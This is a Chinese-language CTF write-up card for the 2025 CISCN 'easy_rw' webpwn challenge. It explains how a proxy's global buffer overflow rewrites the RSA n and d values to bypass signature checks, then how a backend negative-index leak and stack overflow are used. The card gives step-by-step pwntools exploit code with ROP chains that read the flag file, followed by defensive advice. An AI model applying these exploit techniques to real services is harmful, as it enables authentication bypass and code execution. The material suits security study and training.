---
id: ctf-pwn-webpwn-proxy-rsa-auth-bypass-backend-oob-rop
title: CTF webpwn 双进程架构：proxy 全局溢出改写 RSA n/d 绕过鉴权 + 后端负索引泄露与栈溢出 ORW
type: scenario
domain: ctf
path: ctf/pwn
technique: webpwn-proxy-rsa-auth-bypass-backend-rop
aliases:
- 2025 CISCN easy_rw
- webpwn 架构
- proxy 鉴权绕过
- RSA d=1 绕过签名
- show 负索引泄露 libc
- memcpy_w 栈溢出
- rtsp webpwn
tags:
- pwn
- ctf
- webpwn
- proxy
- rsa
- auth-bypass
- global-overflow
- oob-read
- stack-overflow
- rop
- orw
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V162
  verified_at: '2026-11-06T14:03:21+08:00'
  notes: 已对照 91040 原文与 13 张图核对：proxy 协议、UPX、全局溢出 n=138759/d=1、hash 截断 0x21e6、show 负索引、memcpy_w 栈溢出与 ORW 均一致；已补充指向同题另一解法卡（91028）的互链。PoC 未在本机复跑。
---

## 一句话结论

在 webpwn 题中，对外端口往往只是 proxy（认证/协议转换），真正的业务在它后面的 server：本题 proxy 的配置写入存在全局缓冲区溢出，可改写 RSA 验签使用的全局 `n`/`d`，令 `d=1`、`n` 大于所选密文、密文取 `hash("hack")` 的截断值，即可通过签名校验拿到 cookie；再经 proxy 转发到 server，利用 `show` 的负索引越界读泄露 libc，最后用 `memcpy_w` 的 32 字节栈缓冲区溢出 ROP 执行 `open/read/sendfile` 读取 flag。

## 原理

- **webpwn 双进程架构**：客户端 → proxy（认证、cookie、配置、协议转换）→ server（业务解析、堆管理、命令执行）。直接攻击 server 通常不可达，必须先通过 proxy 的认证与 cookie 校验，再由 `0x7F687985` 分支把 payload 转发给 server。
- **proxy 协议**：每包为 4 字节大端 `choice` + 4 字节大端 `size` + `size` 字节 payload；`0xFFFF2525` 是 RSA 签名认证，`0x7F687985` 是带 cookie 的转发，`0x85856547` 是写配置，`0x85856546` 是读日志。
- **RSA 验签的弱实现**：proxy 计算 `RSA(ciphertext, d, n)`，把结果与 `hash("hack")` 用 `strncmp` 比较前 `strlen(hash)` 字节；`hash` 是 FNV-1a 变体并把 `BYTE2` 清零，实际比较长度很短。`refresh_config` 从 `config.txt` 读取 `n=`/`d=`，附件默认两者为 0，因此正常认证必然失败。
- **全局配置溢出**：`0x85856547` 分支把最多 `0x1100` 字节 `memcpy` 到全局 `dest_`，没有边界检查；`n`/`d` 就在相邻全局区。用 `a*0x100 + "n=138759&d=1"` 覆盖后，`refresh_config` 会把 `n=138759`、`d=1` 写入全局。
- **为什么 `d=1` 能绕过**：RSA“解密”变成 `ciphertext^1 mod n = ciphertext`；只要 `n > ciphertext`，结果就是密文本身。选择 `ciphertext=0x21e6`，而 `hash("hack")` 的截断比较值末三字节为 `00 21 e6`，`strncmp` 命中，认证通过并返回 32 字节随机 cookie。
- **server 侧漏洞**：
  - `url_parse` 解析 `rtsp://<host>/<...{...}...>`，host 最多 8 字节、花括号内容最多 `0x1FF` 字节；
  - `sha_check`/`sha_encode` 用 SHA1 与 `strcmp` 比较，存在截断/可爆破问题；
  - `show(index)` 用 `atoi` 取索引且不检查下界，负索引会读到 `HeapManager.blocks` 之前的 GOT/指针，泄露 libc；
  - `vuln_cpy` 找到 `\r\n` 后调用 `memcpy_w(p_buf, len)`，而 `memcpy_w` 的目标是 32 字节栈缓冲区，长度可达 `0x418`，形成直接栈溢出。
- **ORW 收尾**：本题拿到的是经 proxy 转发的间接 shell/管道，直接 `system("/bin/sh")` 不稳；用 ROP 调 `read(4, writable, 0x30)` 把 `./flag` 写入可写地址，再 `open(path,0)`、`sendfile(4, fd, 0, 0x50)` 把 flag 发回 socket。
- **辅助点**：proxy 是 UPX 加壳，需先脱壳；proxy 用 `fork()` 处理连接，gdb 需 `set follow-fork-mode child`；远程偏移与本地 libc 不同，需按泄露的 libc 基址调整。

## 触发条件

- 目标为 webpwn 题型：对外暴露的是 proxy，后端 server 仅能通过 proxy 协议访问。
- proxy 存在可覆盖全局 `n`/`d` 的缓冲区溢出，且 RSA 验签使用这两个全局值。
- proxy 认证只比较 hash 的截断前缀，`d`/`n` 可被改写为弱值。
- server 存在负索引 `show` 泄露与 `memcpy_w` 栈溢出，且能通过 proxy 转发到达。
- 二进制有 PIE/NX/Canary 等保护，需要先泄露 libc 再 ROP；若可直接 `system` 则更简单。

## 利用步骤

1. **脱壳与恢复**：识别 proxy 为 UPX，脱壳后恢复 `read_config/refresh_config/write_config`、`RSA`、`hash`、`proxy_vuln` 等函数名。
2. **封装协议**：`p32(choice, endian='big') + p32(size, endian='big') + payload`。
3. **覆盖 n/d**：发送 `choice=0x85856547`，`size=0x10c`，payload 为 `b'a'*0x100 + b'n=138759&d=1'`；该分支 `memcpy` 到全局 `dest_` 并溢出到 `n`/`d`，随后 `refresh_config/write_config` 落盘。
4. **绕过认证**：发送 `choice=0xFFFF2525`，`size=8`，payload 为 `p64(0x21e6, endian='big')`；`RSA(0x21e6,1,138759)=0x21e6`，与 `hash("hack")` 截断前缀匹配，返回 32 字节 cookie。
5. **经 proxy 泄露 libc**：发送 `choice=0x7F687985`，payload = cookie + `rtsp://<8字节host>/{"command":"show","param1":"-10"}`；server `show` 负索引读出 GOT/libc 指针，proxy 把响应回传，解析出 libc 基址。
6. **经 proxy 栈溢出**：发送 `choice=0x7F687985`，payload = cookie + `rtsp://` + `b'a'*0x21` + ROP 链 + `\r\n}{`；`vuln_cpy` 的 `memcpy_w` 覆盖返回地址。
7. **ROP ORW**：`read(4, tzname, 0x30)` 写入 `./flag`，`open(tzname,0)` 得到 fd，`sendfile(4, fd, 0, 0x50)` 回传 flag。
8. 接收 flag；若管道阻塞导致 read 不执行，可调整发送长度/分包，让 server 的 `read` 读到 `./flag`。

## PoC

代理协议与认证绕过核心（偏移按实际二进制调整）：

```python
from pwn import *
context.arch = 'amd64'
io = remote('target', 8888)

# 1) 覆盖全局 n/d
choice = p32(0x85856547, endian='big')
size   = p32(0x10c, endian='big')
io.send(choice + size + b'a'*0x100 + b'n=138759&d=1')

# 2) 绕过 RSA 验签，拿 cookie
io = remote('target', 8888)
choice = p32(0xFFFF2525, endian='big')
size   = p32(0x8, endian='big')
io.send(choice + size + p64(0x21e6, endian='big'))
cookie = io.recv(32)

# 3) 通过 proxy 转发 show 负索引泄露 libc
io = remote('target', 8888)
choice = p32(0x7F687985, endian='big')
size   = p32(0x80, endian='big')
pay = b'rtsp://\x01\x68\x49\x74/{"command":"show","param1":"-10"}'
io.send(choice + size + cookie + pay.ljust(0x80, b'a'))
io.recvuntil(b'Content:'); io.recvuntil(b' ')
libc_base = int(io.recv(15), 10) - 0x147e90
```

```python
# 4) 栈溢出 + ORW
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x904a9
pop_rcx = libc_base + 0x3d1ee
pay  = b'a'*0x21 + flat(pop_rdi, 4, pop_rsi, libc_base + libc.sym['tzname'],
                         pop_rdx_rbx, 0x30, 0, libc_base + libc.sym['read'])
pay += flat(pop_rdi, libc_base + libc.sym['tzname'], pop_rsi, 0,
            libc_base + libc.sym['open'])
pay += flat(pop_rdi, 4, pop_rsi, 5, pop_rdx_rbx, 0, 0, pop_rcx, 0x50,
            libc_base + libc.sym['sendfile'])
payload = b'rtsp://' + pay + b'\r\n}{'
io.send(p32(0x7F687985, endian='big') + p32(0x3ff+0x20+0x8, endian='big') +
        cookie + payload.ljust(0x3ff+0x20+0x8, b'a') + b'./flag\x00\x00')
io.interactive()
```

说明：原文在 2025 CISCN easy_rw 上打通并拿到 `flag{...}`，最终 exp 截图见原文；本卡未复跑。`0x147e90`、各 ROP 偏移与 libc 版本相关，需按目标环境调整。

## 变体与关联

- **代理鉴权绕过变体**：改写 `d=1`/`n>ciphertext` 是最直接形式；也可改 `d` 为其他小值、泄漏 `n/d`、利用 `e=1`、或让比较值可控；核心是“内存破坏 → 弱化签名校验”。
- **后端入口变体**：RTSP 解析可换成 HTTP/自定义协议；`show` 负索引可换成 OOB 写/未初始化读；`memcpy_w` 可换成其他定长栈缓冲区拷贝。
- **收尾变体**：能直接 `system("/bin/sh")` 时不需要 ORW；沙箱/seccomp 限制 `execve` 时用 `open/read/write`；也可用 `sendfile` 减少 ROP 长度。
- **辅助技巧**：UPX 脱壳、fork 子进程调试、管道阻塞控制 `read` 长度、libc 偏移按泄露值动态计算。
- **关联**：[[ctf-pwn-webpwn-proxy-config-overwrite-heap-leak-backdoor-orw]]（同题 easy_rw 另一解法：2.31 堆菜单泄露 + backdoor 溢出，可与本卡的负索引 + memcpy_w 路线对照）、[[binary-pwn-libevent-evbuffer-global-overflow-fake-chain-orw]]（webpwn 全局溢出 + ORW）、[[ctf-pwn-negative-index-note-array-copy-reloc-leak-got-system]]（负索引泄露 GOT）、[[ctf-pwn-signal-handler-rt-sigframe-srop-orw]]（SROP/ORW 收尾）、[[ctf-pwn-vfs-inode-link-permission-srop-orw]]（ORW 模板）。

## 检测与防御

- **认证实现**：RSA 验签必须比较完整哈希并使用常量时间比较；不要把私钥指数/模数放在可被缓冲区溢出覆盖的相邻全局区；配置解析应限制写入长度。
- **内存安全**：所有 `memcpy` 目标做长度校验；栈缓冲区使用 canary/FORTIFY；数组索引做上下界检查；开启 PIE/ASLR/NX。
- **架构隔离**：proxy 与 server 最小权限分离，proxy 不应把未验证的原始 payload 直接转发；后端只监听内部地址并做独立认证。
- **CTF 解题提示**：遇到“webpwn”先分清 proxy/server、协议与认证；先找 proxy 的认证绕过，再找 server 的泄露与溢出；注意 UPX、fork 与管道阻塞。
